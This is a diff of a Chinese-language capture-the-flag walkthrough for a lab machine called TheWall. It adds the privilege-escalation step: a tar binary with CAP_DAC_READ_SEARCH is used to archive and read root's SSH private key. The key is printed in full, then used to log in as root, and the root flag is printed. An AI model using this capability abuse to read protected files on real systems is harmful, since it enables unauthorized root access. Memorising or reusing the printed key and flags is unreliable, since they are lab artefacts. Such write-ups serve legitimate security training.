@@ -141,7 +141,7 @@ john@TheWall:~$ cat user.txt
 cc5db5e7b0a26e807765f47a006f6221
 ```
 
-# 提权-
+# 提权-CAP_DAC_READ_SEARCH
 
 
 我已经使用**scp**将**Linpeas**复制到机器中，如下所示
@@ -178,8 +178,63 @@ find / -xdev -group 1000 2>/dev/null
 ```
 
 ```c
-john@TheWall:~$ /usr/sbin/tar cf id_rsa.tar /id_rsa
+john@TheWall:~$ /usr/sbin/tar -zcf id_rsa.tar /id_rsa
 
-john@TheWall:~$ tar xf id_rsa.tar 
+john@TheWall:~$ tar -vxf id_rsa.tar 
 john@TheWall:~$ cat id_rsa
+
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+
+```
+
+```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ nano thewall 
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ chmod 600 thewall 
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ sudo ssh -i thewall root@192.168.18.238
+
+
+root@TheWall:~# cat r0Ot.txT 
+4be82a3be9aed6eea5d0cce68e17662e
+
 ```
